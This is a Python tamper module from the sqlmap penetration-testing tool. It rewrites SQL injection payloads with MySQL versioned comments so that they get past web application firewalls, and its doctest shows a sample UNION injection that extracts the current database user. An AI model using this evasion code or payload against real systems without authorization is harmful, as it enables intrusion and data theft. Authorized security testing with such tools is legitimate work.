#!/usr/bin/env python

"""
Copyright (c) 2006-2014 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

def tamper(payload, **kwargs):
    """
    Adds versioned MySQL comment before each keyword

    Requirement:
        * MySQL < 5.1

    Tested against:
        * MySQL 4.0.18, 5.0.22

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL
        * Used during the ModSecurity SQL injection challenge,
          http://modsecurity.org/demo/challenge.html

    >>> tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")
    "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa"
    """

    kb.keywords = set([u'EXECUTE', u'EXPLAIN', u'OCTET_LENGTH', u'ININDEX', u'DUAL', u'LAST', u'NUMERIC', u'ACTION', u'TRANSLATION', u'FULL', u'IFNULL', u'DISCONNECT', u'UTC_DATEUTC_TIME', u'CURRENT', u'VERSION', u'GO', u'CORRESPONDING', u'MINUTE', u'MAX', u'PRIMARY', u'ONLY', u'VALUES', u'LOOP', u'VIEW', u'STARTINGSTRAIGHT_JOIN', u'FOREIGN', u'CURRENT_TIMESTAMP', u'USER', u'SELECT', u'INTERVAL', u'POSITION', u'MODIFIES', u'CONSTRAINTS', u'COUNT', u'ROLLBACK', u'UNION', u'UNIQUEUNLOCK', u'DETERMINISTIC', u'ELSE', u'SYSTEM_USER', u'IDENTITY', u'NCHAR', u'INT', u'MINUTE_MICROSECOND', u'NOT', u'REAL', u'OF', u'READ', u'USAGE', u'SEPARATOR', u'ENCLOSED', u'FETCH', u'DROP', u'SUBSTRING', u'TABLE', u'EXTRACT', u'LEFT', u'SIGNAL', u'FULLTEXT', u'UPPER', u'ALL', u'JOIN', u'LIKE', u'DATABASE', u'WHENEVER', u'PRECISIONPRIMARY', u'ESCAPED', u'KILLLEADING', u'EXCEPTION', u'DESCRIBE', u'SQLERROR', u'DATE', u'HOUR_SECOND', u'SMALLINT', u'LEVEL', u'ITERATE', u'FORCE', u'KEYS', u'INTERSECT', u'FOUND', u'DATABASES', u'MEDIUMTEXTMIDDLEINT', u'MINUTE_SECOND', u'CALL', u'LONGBLOBLONGTEXT', u'CREATE', u'ASENSITIVE', u'TRANSACTION', u'MIN', u'CURRENT_DATE', u'LIMIT', u'ROUTINE', u'TRUE', u'OPTIMIZE', u'EXCEPT', u'SESSION_USER', u'NAMES', u'CHECK', u'CONDITION', u'RETURNS', u'SQLCODE', u'PARTIAL', u'FIRST', u'CONTAINS', u'MONTH', u'OUTFILE', u'CATALOG', u'DELETE', u'SOME', u'YEAR_MONTH', u'CURRENT_USER', u'TRANSLATE', u'BEGIN', u'OPEN', u'DEALLOCATE', u'FUNCTION', u'FOREIGNFROM', u'END', u'CURRENT_PATH', u'UPDATE', u'SET', u'TIMESTAMP', u'SQLWARNING', u'CHAR_LENGTH', u'SSL', u'CONTINUE', u'TIME', u'TINYBLOB', u'CURRENT_TIME', u'UNKNOWN', u'SECTION', u'CHAR', u'BINARYBLOB', u'RETURN', u'TIMEZONE_MINUTE', u'HOUR', u'COLUMN', u'WORK', u'ASC', u'COMMIT', u'DESC', u'NULLIF', u'TRIM', u'DECIMAL', u'MATCH', u'ROWS', u'FALSE', u'DESCRIPTOR', u'FLOAT8', u'KEY', u'EACH', u'FLOAT4', u'INFILE', u'DO', u'REVOKE', u'TINYTEXTTO', u'SMALLINTSONAME', u'DIAGNOSTICS', u'INTERVALINTO', u'BIT_LENGTH', u'PARAMETER', u'CONCAT', u'BOTH', u'SCHEMASSECOND_MICROSECOND', u'IMMEDIATE', u'INT4', u'ALLOCATE', u'INT3', u'INT2', u'WRITEXOR', u'BIT', u'INT8', u'INTO', u'ASSERTION', u'RESIGNAL', u'RIGHT', u'FROM', u'ZONE', u'FLOAT', u'DEFAULTDELAYED', u'COLLATION', u'INDICATOR', u'PAD', u'VARBINARY', u'ELSEELSEIF', u'ABSOLUTE', u'SQL_SMALL_RESULT', u'NEXT', u'SESSION', u'CONDITIONCONSTRAINT', u'OVERLAPS', u'NATURAL', u'EXEC', u'NATIONAL', u'MODULE', u'RELATIVE', u'WHERE', u'DECLARE', u'INSENSITIVE', u'CURSOR', u'DEFERRED', u'BIGINT', u'ELSEIF', u'GROUP', u'MEDIUMINT', u'DAY_SECOND', u'LEAVE', u'VARCHARACTERVARYING', u'GET', u'DISTINCT', u'WITH', u'UNSIGNED', u'ALTER', u'COALESCE', u'INTINT1', u'FOR', u'PROCEDURE', u'LINESLOAD', u'PRIOR', u'EXTERNAL', u'INPUT', u'UNTIL', u'AUTHORIZATION', u'AND', u'INITIALLY', u'YEAR', u'CONNECTION', u'ANY', u'MOD', u'THEN', u'GLOBAL', u'LOCALTIMESTAMP', u'SENSITIVE', u'LONG', u'REGEXP', u'CASE', u'LOW_PRIORITY', u'REALREFERENCES', u'CAST', u'CHARACTER_LENGTH', u'LOCK', u'SECOND', u'BETWEEN', u'CURRENT_TIMECURRENT_TIMESTAMP', u'TIMEZONE_HOUR', u'IGNORE', u'DOMAIN', u'RENAME', u'LOWER', u'ZEROFILL', u'UNDO', u'PURGE', u'PATH', u'DIV', u'INSERT', u'PRIVILEGES', u'EXISTS', u'TERMINATED', u'LEADING', u'IS', u'INNER', u'IN', u'VARCHAR', u'ANALYZE', u'IF', u'DISTINCTDISTINCTROW', u'ARE', u'HAVING', u'PRESERVE', u'SQL_BIG_RESULT', u'HANDLER', u'BY', u'OPTIONALLYOR', u'DAY_HOUR', u'SPECIFIC', u'GOTO', u'GRANT', u'TRIGGER', u'COLLATE', u'ESCAPE', u'UNIQUE', u'BEFORE', u'ON', u'DOUBLE', u'SQL_CALC_FOUND_ROWS', u'READS', u'SQL', u'OUTPUT', u'OR', u'CONVERT', u'RESTRICT', u'SPATIAL', u'DEC', u'INOUT', u'MEDIUMBLOB', u'LANGUAGE', u'SPACE', u'CONNECT', u'INTEGER', u'REQUIRERESTRICT', u'REPEAT', u'ASASC', u'VARYING', u'CASECHANGE', u'CASCADED', u'RELEASE', u'SIZE', u'PRECISION', u'RLIKE', u'AVG', u'HIGH_PRIORITYHOUR_MICROSECOND', u'OPTION', u'PREPARE', u'DEFAULT', u'SUM', u'CROSS', u'WHILE', u'REFERENCES', u'ORDER', u'NO', u'REPLACE', u'SQLSTATE', u'CLOSE', u'SCHEMA', u'OUTER', u'ISOLATION', u'HOUR_MINUTE', u'WRITE', u'CASCADE', u'ADD', u'TEMPORARY', u'DAY_MICROSECONDDAY_MINUTE', u'DEFERRABLE', u'EXIT', u'FALSEFETCH', u'USING', u'OUT', u'USE', u'CHARACTER', u'SQLSTATESQLWARNING', u'TINYINT', u'NULL', u'TRAILING', u'LOCALTIME', u'CONSTRAINT', u'WHEN', u'TO', u'SQLEXCEPTION', u'DAY', u'SHOW', u'VALUE', u'ISNULL', u'AS', u'NOTNO_WRITE_TO_BINLOG', u'AT', u'LOCAL', u'UTC_TIMESTAMP', u'SCROLL'])

    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!0%s" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", lambda match: process(match), retVal)
        retVal = retVal.replace(" /*!0", "/*!0")

    return retVal
